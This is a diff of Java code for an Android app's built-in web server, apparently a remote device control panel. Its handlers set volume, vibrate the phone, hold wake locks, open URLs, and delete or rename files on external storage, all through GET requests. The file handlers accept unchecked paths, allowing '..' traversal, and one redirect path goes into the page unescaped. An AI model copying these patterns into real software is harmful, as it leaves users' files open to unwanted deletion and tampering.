+        html.append("<h3 style=\"margin-bottom: 10px;\">&#128266; Volume Control</h3>");
+        try {
+            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+            if (audioManager != null) {
+                int ringMax = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING);
+                int ringVol = audioManager.getStreamVolume(AudioManager.STREAM_RING);
+                int mediaMax = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
+                int mediaVol = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
+
+                html.append("<div style=\"display: grid; gap: 10px;\">");
+                html.append(
+                        "<div style=\"display: flex; justify-content: space-between; align-items: center; padding: 8px 0;\">");
+                html.append("<span style=\"color: #888;\">Ring Volume: ").append(ringVol).append("/").append(ringMax)
+                        .append("</span>");
+                html.append("<div style=\"display: flex; gap: 5px;\">");
+                html.append(
+                        "<a href=\"/settings/volume?stream=ring&value=0\" style=\"padding: 6px 12px; background: rgba(231,76,60,0.2); border-radius: 6px; color: #e74c3c; text-decoration: none; font-size: 0.8rem;\">Mute</a>");
+                html.append("<a href=\"/settings/volume?stream=ring&value=").append(ringMax).append(
+                        "\" style=\"padding: 6px 12px; background: rgba(46,204,113,0.2); border-radius: 6px; color: #2ecc71; text-decoration: none; font-size: 0.8rem;\">Max</a>");
+                html.append("</div></div>");
+
+                html.append(
+                        "<div style=\"display: flex; justify-content: space-between; align-items: center; padding: 8px 0;\">");
+                html.append("<span style=\"color: #888;\">Media Volume: ").append(mediaVol).append("/").append(mediaMax)
+                        .append("</span>");
+                html.append("<div style=\"display: flex; gap: 5px;\">");
+                html.append(
+                        "<a href=\"/settings/volume?stream=media&value=0\" style=\"padding: 6px 12px; background: rgba(231,76,60,0.2); border-radius: 6px; color: #e74c3c; text-decoration: none; font-size: 0.8rem;\">Mute</a>");
+                html.append("<a href=\"/settings/volume?stream=media&value=").append(mediaMax).append(
+                        "\" style=\"padding: 6px 12px; background: rgba(46,204,113,0.2); border-radius: 6px; color: #2ecc71; text-decoration: none; font-size: 0.8rem;\">Max</a>");
+                html.append("</div></div>");
+                html.append("</div>");
+            }
+        } catch (Exception e) {
+            html.append("<p style=\"color: #888;\">Error reading volume: ").append(escapeHtml(e.getMessage()))
+                    .append("</p>");
+        }
+        html.append("</div>");
+
+        // Open URL
+        html.append(
+                "<div style=\"padding: 20px; background: rgba(255,255,255,0.03); border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(255,255,255,0.08);\">");
+        html.append("<h3 style=\"margin-bottom: 10px;\">&#127760; Open URL on Device</h3>");
+        html.append("<form method=\"get\" action=\"/settings/openurl\">");
+        html.append("<div style=\"display: flex; gap: 10px;\">");
+        html.append(
+                "<input type=\"text\" name=\"url\" placeholder=\"https://example.com\" required style=\"flex: 1; padding: 12px 16px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.2); border-radius: 10px; color: #fff; font-size: 0.9rem; outline: none;\">");
+        html.append(
+                "<button type=\"submit\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; cursor: pointer; font-size: 0.9rem;\">Open</button>");
+        html.append("</div></form></div>");
+
+        html.append("</div>");
+        html.append(HTML_FOOTER);
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
+    }
+
+    private Response serveVibrate(Map<String, String> params) {
+        int ms = 1000;
+        try {
+            ms = Integer.parseInt(params.get("ms"));
+        } catch (Exception e) {
+        }
+        try {
+            Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
+            if (vibrator != null) {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    vibrator.vibrate(
+                            android.os.VibrationEffect.createOneShot(ms, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                } else {
+                    vibrator.vibrate(ms);
+                }
+            }
+        } catch (Exception e) {
+        }
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/settings\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#128243; Vibrating for " + ms + "ms...</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveWakeLock(Map<String, String> params) {
+        String action = params.get("action");
+        if ("acquire".equals(action)) {
+            WakeLockHelper.acquire(context, false, true);
+        } else if ("release".equals(action)) {
+            WakeLockHelper.release();
+        }
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/settings\"></head><body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveVolume(Map<String, String> params) {
+        try {
+            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
+            String stream = params.get("stream");
+            int value = Integer.parseInt(params.get("value"));
+
+            if (audioManager != null) {
+                int streamType = "ring".equals(stream) ? AudioManager.STREAM_RING : AudioManager.STREAM_MUSIC;
+                audioManager.setStreamVolume(streamType, value, 0);
+            }
+        } catch (Exception e) {
+        }
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/settings\"></head><body></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    private Response serveOpenUrl(Map<String, String> params) {
+        String url = params.get("url");
+        String msg = "Missing URL";
+        if (url != null && !url.isEmpty()) {
+            try {
+                if (!url.startsWith("http://") && !url.startsWith("https://")) {
+                    url = "https://" + url;
+                }
+                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                msg = "Opening " + url + " on device...";
+            } catch (Exception e) {
+                msg = "Error: " + e.getMessage();
+            }
+        }
+        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"2;url=/settings\"></head>" +
+                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                +
+                "<h2>&#127760; " + escapeHtml(msg) + "</h2></body></html>";
+        return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+    }
+
+    // ==================== FILE OPERATIONS ====================
+
+    private Response serveFileDelete(Map<String, String> params) {
+        String path = params.get("path");
+        if (path != null && !path.isEmpty()) {
+            try {
+                File file = new File(Environment.getExternalStorageDirectory(), path);
+                boolean deleted;
+                if (file.isDirectory()) {
+                    deleted = deleteRecursive(file);
+                } else {
+                    deleted = file.delete();
+                }
+                String msg = deleted ? "Deleted successfully!" : "Failed to delete.";
+                // Go back to parent directory
+                String parentPath = path.contains("/") ? path.substring(0, path.lastIndexOf('/')) : "";
+                String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/files/"
+                        + parentPath + "\"></head>" +
+                        "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                        +
+                        "<h2>" + msg + "</h2></body></html>";
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+            } catch (Exception e) {
+                return serveError("Delete failed: " + e.getMessage());
+            }
+        }
+        return serve404();
+    }
+
+    private boolean deleteRecursive(File fileOrDirectory) {
+        if (fileOrDirectory.isDirectory()) {
+            File[] children = fileOrDirectory.listFiles();
+            if (children != null) {
+                for (File child : children) {
+                    deleteRecursive(child);
+                }
+            }
+        }
+        return fileOrDirectory.delete();
+    }
+
+    private Response serveFileRename(Map<String, String> params) {
+        String path = params.get("path");
+        String newName = params.get("name");
+        if (path != null && newName != null && !path.isEmpty() && !newName.isEmpty()) {
+            try {
+                File file = new File(Environment.getExternalStorageDirectory(), path);
+                File newFile = new File(file.getParentFile(), newName);
+                boolean renamed = file.renameTo(newFile);
+                String msg = renamed ? "Renamed successfully!" : "Failed to rename.";
+                String parentPath = path.contains("/") ? path.substring(0, path.lastIndexOf('/')) : "";
+                String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/files/"
+                        + parentPath + "\"></head>" +
+                        "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
+                        +
+                        "<h2>" + msg + "</h2></body></html>";
+                return newFixedLengthResponse(Response.Status.OK, "text/html", html);
+            } catch (Exception e) {
+                return serveError("Rename failed: " + e.getMessage());
+            }
+        }
+        return serve404();
     }
 }
